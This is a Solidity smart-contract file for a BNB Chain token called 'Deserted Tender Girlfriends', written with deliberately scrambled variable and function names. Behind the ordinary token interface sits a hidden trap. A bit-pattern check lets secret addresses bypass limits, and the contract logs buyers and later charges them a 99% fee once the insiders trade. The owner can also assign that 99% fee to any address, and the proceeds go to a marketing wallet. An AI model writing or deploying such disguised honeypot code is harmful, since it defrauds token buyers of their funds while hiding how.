/**
 *Submitted for verification at BscScan.com on 2022-12-09
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract DesertedTenderGirlfriends is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Deserted Tender Girlfriends ";
    string constant _symbol = "DesertedTenderGirlfriends";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private tradingMaxTxAuto;
    mapping(address => bool) private liquidityBotsBuyIsTrading;
    mapping(address => bool) private receiverBuyTxSwapTrading;
    mapping(address => bool) private receiverExemptMarketingSellBurn;
    mapping(address => uint256) private txFeeIsMax;
    mapping(uint256 => address) private tradingReceiverTxBotsTeam;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private tradingExemptBotsMarketing = 0;
    uint256 private receiverWalletModeAuto = 8;

    //SELL FEES
    uint256 private txIsBurnLaunched = 0;
    uint256 private feeReceiverIsTrading = 8;

    uint256 private limitMarketingSwapBots = receiverWalletModeAuto + tradingExemptBotsMarketing;
    uint256 private botsReceiverBuyMode = 100;

    address private modeWalletLiquidityMarketingSwap = (msg.sender); // auto-liq address
    address private walletIsTeamMarketing = (0x90cde6CcE0d852c7E1a990a8fffFE8DD51342EA5); // marketing address
    address private isModeReceiverExemptBotsMarketing = DEAD;
    address private tradingLaunchedSellLimit = DEAD;
    address private modeMarketingBuyMin = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private botsLaunchedLiquidityMarketing;
    uint256 private txBurnMarketingMin;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private sellAutoBurnReceiver;
    uint256 private autoTxTradingLiquidityReceiver;
    uint256 private limitWalletReceiverMode;
    uint256 private feeLiquidityMinIs;
    uint256 private launchedBuyAutoBurn;

    bool private modeSellTxMarketingSwapTrading = true;
    bool private receiverExemptMarketingSellBurnMode = true;
    bool private swapLaunchedLimitTeamBotsExemptLiquidity = true;
    bool private autoBotsSellSwap = true;
    bool private minBotsAutoBurn = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private burnTradingAutoSell = _totalSupply / 1000; // 0.1%

    
    bool private swapMinExemptMax = false;
    bool private launchedSellBuyWallet = false;
    uint256 private botsTxBuyAuto = 0;
    bool private autoTradingWalletBuy = false;
    uint256 private liquidityExemptBurnTeam = 0;
    bool private isBuyMarketingAuto = false;
    bool private minMarketingSellTeam = false;
    bool private maxLiquidityModeTrading = false;
    uint256 private sellLimitLaunchedIsAutoFeeBuy = 0;
    uint256 private limitFeeMarketingTrading = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        sellAutoBurnReceiver = true;

        tradingMaxTxAuto[msg.sender] = true;
        tradingMaxTxAuto[address(this)] = true;

        liquidityBotsBuyIsTrading[msg.sender] = true;
        liquidityBotsBuyIsTrading[0x0000000000000000000000000000000000000000] = true;
        liquidityBotsBuyIsTrading[0x000000000000000000000000000000000000dEaD] = true;
        liquidityBotsBuyIsTrading[address(this)] = true;

        receiverBuyTxSwapTrading[msg.sender] = true;
        receiverBuyTxSwapTrading[0x0000000000000000000000000000000000000000] = true;
        receiverBuyTxSwapTrading[0x000000000000000000000000000000000000dEaD] = true;
        receiverBuyTxSwapTrading[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return maxTxSellAuto(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return maxTxSellAuto(sender, recipient, amount);
    }

    function maxTxSellAuto(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (minMarketingSellTeam == swapLaunchedLimitTeamBotsExemptLiquidity) {
            minMarketingSellTeam = autoTradingWalletBuy;
        }


        bool bLimitTxWalletValue = autoBotsMaxWallet(sender) || autoBotsMaxWallet(recipient);
        
        if (launchedSellBuyWallet != minMarketingSellTeam) {
            launchedSellBuyWallet = receiverExemptMarketingSellBurnMode;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                botsBurnIsMaxTx();
            }
            if (!bLimitTxWalletValue) {
                walletReceiverFeeMode(recipient);
            }
        }
        
        if (minMarketingSellTeam != modeSellTxMarketingSwapTrading) {
            minMarketingSellTeam = receiverExemptMarketingSellBurnMode;
        }


        if (inSwap || bLimitTxWalletValue) {return autoFeeSwapBurnTradingTeamBuy(sender, recipient, amount);}

        if (!tradingMaxTxAuto[sender] && !tradingMaxTxAuto[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || receiverBuyTxSwapTrading[sender] || receiverBuyTxSwapTrading[recipient], "Max TX Limit has been triggered");

        if (teamBotsFeeExempt()) {isSellSwapMin();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        if (maxLiquidityModeTrading == autoTradingWalletBuy) {
            maxLiquidityModeTrading = minMarketingSellTeam;
        }

        if (isBuyMarketingAuto != maxLiquidityModeTrading) {
            isBuyMarketingAuto = maxLiquidityModeTrading;
        }

        if (liquidityExemptBurnTeam != limitMarketingSwapBots) {
            liquidityExemptBurnTeam = limitMarketingSwapBots;
        }


        uint256 amountReceived = exemptMinMaxTrading(sender) ? limitFeeTeamLaunchedBuyAuto(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function autoFeeSwapBurnTradingTeamBuy(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function exemptMinMaxTrading(address sender) internal view returns (bool) {
        return !liquidityBotsBuyIsTrading[sender];
    }

    function buyTxSellAutoReceiverLaunchedMax(address sender, bool selling) internal returns (uint256) {
        
        if (sellLimitLaunchedIsAutoFeeBuy != txIsBurnLaunched) {
            sellLimitLaunchedIsAutoFeeBuy = sellLimitLaunchedIsAutoFeeBuy;
        }

        if (liquidityExemptBurnTeam != txIsBurnLaunched) {
            liquidityExemptBurnTeam = limitMarketingSwapBots;
        }


        if (selling) {
            limitMarketingSwapBots = feeReceiverIsTrading + txIsBurnLaunched;
            return feeMinIsLiquidityTxReceiverSwap(sender, limitMarketingSwapBots);
        }
        if (!selling && sender == uniswapV2Pair) {
            limitMarketingSwapBots = receiverWalletModeAuto + tradingExemptBotsMarketing;
            return limitMarketingSwapBots;
        }
        return feeMinIsLiquidityTxReceiverSwap(sender, limitMarketingSwapBots);
    }

    function limitFeeTeamLaunchedBuyAuto(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (swapMinExemptMax == autoTradingWalletBuy) {
            swapMinExemptMax = receiverExemptMarketingSellBurnMode;
        }


        uint256 feeAmount = amount.mul(buyTxSellAutoReceiverLaunchedMax(sender, receiver == uniswapV2Pair)).div(botsReceiverBuyMode);

        if (receiverExemptMarketingSellBurn[sender] || receiverExemptMarketingSellBurn[receiver]) {
            feeAmount = amount.mul(99).div(botsReceiverBuyMode);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function autoBotsMaxWallet(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function feeMinIsLiquidityTxReceiverSwap(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = txFeeIsMax[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function walletReceiverFeeMode(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        tradingReceiverTxBotsTeam[exemptLimitValue] = addr;
    }

    function botsBurnIsMaxTx() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (txFeeIsMax[tradingReceiverTxBotsTeam[i]] == 0) {
                    txFeeIsMax[tradingReceiverTxBotsTeam[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(walletIsTeamMarketing).transfer(amountBNB * amountPercentage / 100);
    }

    function teamBotsFeeExempt() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    minBotsAutoBurn &&
    _balances[address(this)] >= burnTradingAutoSell;
    }

    function isSellSwapMin() internal swapping {
        
        uint256 amountToLiquify = burnTradingAutoSell.mul(tradingExemptBotsMarketing).div(limitMarketingSwapBots).div(2);
        uint256 amountToSwap = burnTradingAutoSell.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (limitFeeMarketingTrading != burnTradingAutoSell) {
            limitFeeMarketingTrading = sellLimitLaunchedIsAutoFeeBuy;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = limitMarketingSwapBots.sub(tradingExemptBotsMarketing.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(tradingExemptBotsMarketing).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(receiverWalletModeAuto).div(totalETHFee);
        
        if (swapMinExemptMax == isBuyMarketingAuto) {
            swapMinExemptMax = isBuyMarketingAuto;
        }


        payable(walletIsTeamMarketing).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                modeWalletLiquidityMarketingSwap,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getTradingLaunchedSellLimit() public view returns (address) {
        if (tradingLaunchedSellLimit != isModeReceiverExemptBotsMarketing) {
            return isModeReceiverExemptBotsMarketing;
        }
        if (tradingLaunchedSellLimit != walletIsTeamMarketing) {
            return walletIsTeamMarketing;
        }
        return tradingLaunchedSellLimit;
    }
    function setTradingLaunchedSellLimit(address a0) public onlyOwner {
        tradingLaunchedSellLimit=a0;
    }

    function getModeWalletLiquidityMarketingSwap() public view returns (address) {
        return modeWalletLiquidityMarketingSwap;
    }
    function setModeWalletLiquidityMarketingSwap(address a0) public onlyOwner {
        if (modeWalletLiquidityMarketingSwap == tradingLaunchedSellLimit) {
            tradingLaunchedSellLimit=a0;
        }
        if (modeWalletLiquidityMarketingSwap == walletIsTeamMarketing) {
            walletIsTeamMarketing=a0;
        }
        modeWalletLiquidityMarketingSwap=a0;
    }

    function getBurnTradingAutoSell() public view returns (uint256) {
        if (burnTradingAutoSell == botsReceiverBuyMode) {
            return botsReceiverBuyMode;
        }
        if (burnTradingAutoSell != feeReceiverIsTrading) {
            return feeReceiverIsTrading;
        }
        if (burnTradingAutoSell == botsReceiverBuyMode) {
            return botsReceiverBuyMode;
        }
        return burnTradingAutoSell;
    }
    function setBurnTradingAutoSell(uint256 a0) public onlyOwner {
        if (burnTradingAutoSell == sellLimitLaunchedIsAutoFeeBuy) {
            sellLimitLaunchedIsAutoFeeBuy=a0;
        }
        if (burnTradingAutoSell == burnTradingAutoSell) {
            burnTradingAutoSell=a0;
        }
        burnTradingAutoSell=a0;
    }

    function getMaxLiquidityModeTrading() public view returns (bool) {
        return maxLiquidityModeTrading;
    }
    function setMaxLiquidityModeTrading(bool a0) public onlyOwner {
        if (maxLiquidityModeTrading == modeSellTxMarketingSwapTrading) {
            modeSellTxMarketingSwapTrading=a0;
        }
        if (maxLiquidityModeTrading == minMarketingSellTeam) {
            minMarketingSellTeam=a0;
        }
        maxLiquidityModeTrading=a0;
    }

    function getReceiverBuyTxSwapTrading(address a0) public view returns (bool) {
        if (receiverBuyTxSwapTrading[a0] == receiverBuyTxSwapTrading[a0]) {
            return swapLaunchedLimitTeamBotsExemptLiquidity;
        }
            return receiverBuyTxSwapTrading[a0];
    }
    function setReceiverBuyTxSwapTrading(address a0,bool a1) public onlyOwner {
        if (receiverBuyTxSwapTrading[a0] != receiverExemptMarketingSellBurn[a0]) {
           receiverExemptMarketingSellBurn[a0]=a1;
        }
        if (a0 != modeWalletLiquidityMarketingSwap) {
            modeSellTxMarketingSwapTrading=a1;
        }
        if (receiverBuyTxSwapTrading[a0] != tradingMaxTxAuto[a0]) {
           tradingMaxTxAuto[a0]=a1;
        }
        receiverBuyTxSwapTrading[a0]=a1;
    }

    function getSellLimitLaunchedIsAutoFeeBuy() public view returns (uint256) {
        if (sellLimitLaunchedIsAutoFeeBuy != tradingExemptBotsMarketing) {
            return tradingExemptBotsMarketing;
        }
        if (sellLimitLaunchedIsAutoFeeBuy != receiverWalletModeAuto) {
            return receiverWalletModeAuto;
        }
        return sellLimitLaunchedIsAutoFeeBuy;
    }
    function setSellLimitLaunchedIsAutoFeeBuy(uint256 a0) public onlyOwner {
        if (sellLimitLaunchedIsAutoFeeBuy != tradingExemptBotsMarketing) {
            tradingExemptBotsMarketing=a0;
        }
        sellLimitLaunchedIsAutoFeeBuy=a0;
    }

    function getSwapLaunchedLimitTeamBotsExemptLiquidity() public view returns (bool) {
        if (swapLaunchedLimitTeamBotsExemptLiquidity != minBotsAutoBurn) {
            return minBotsAutoBurn;
        }
        return swapLaunchedLimitTeamBotsExemptLiquidity;
    }
    function setSwapLaunchedLimitTeamBotsExemptLiquidity(bool a0) public onlyOwner {
        if (swapLaunchedLimitTeamBotsExemptLiquidity != swapMinExemptMax) {
            swapMinExemptMax=a0;
        }
        swapLaunchedLimitTeamBotsExemptLiquidity=a0;
    }

    function getAutoBotsSellSwap() public view returns (bool) {
        if (autoBotsSellSwap == receiverExemptMarketingSellBurnMode) {
            return receiverExemptMarketingSellBurnMode;
        }
        return autoBotsSellSwap;
    }
    function setAutoBotsSellSwap(bool a0) public onlyOwner {
        autoBotsSellSwap=a0;
    }

    function getAutoTradingWalletBuy() public view returns (bool) {
        return autoTradingWalletBuy;
    }
    function setAutoTradingWalletBuy(bool a0) public onlyOwner {
        autoTradingWalletBuy=a0;
    }

    function getTxIsBurnLaunched() public view returns (uint256) {
        if (txIsBurnLaunched != limitMarketingSwapBots) {
            return limitMarketingSwapBots;
        }
        return txIsBurnLaunched;
    }
    function setTxIsBurnLaunched(uint256 a0) public onlyOwner {
        if (txIsBurnLaunched != feeReceiverIsTrading) {
            feeReceiverIsTrading=a0;
        }
        if (txIsBurnLaunched == limitFeeMarketingTrading) {
            limitFeeMarketingTrading=a0;
        }
        if (txIsBurnLaunched != sellLimitLaunchedIsAutoFeeBuy) {
            sellLimitLaunchedIsAutoFeeBuy=a0;
        }
        txIsBurnLaunched=a0;
    }

    function getLiquidityExemptBurnTeam() public view returns (uint256) {
        if (liquidityExemptBurnTeam != liquidityExemptBurnTeam) {
            return liquidityExemptBurnTeam;
        }
        if (liquidityExemptBurnTeam != receiverWalletModeAuto) {
            return receiverWalletModeAuto;
        }
        return liquidityExemptBurnTeam;
    }
    function setLiquidityExemptBurnTeam(uint256 a0) public onlyOwner {
        if (liquidityExemptBurnTeam != botsTxBuyAuto) {
            botsTxBuyAuto=a0;
        }
        if (liquidityExemptBurnTeam != botsReceiverBuyMode) {
            botsReceiverBuyMode=a0;
        }
        liquidityExemptBurnTeam=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}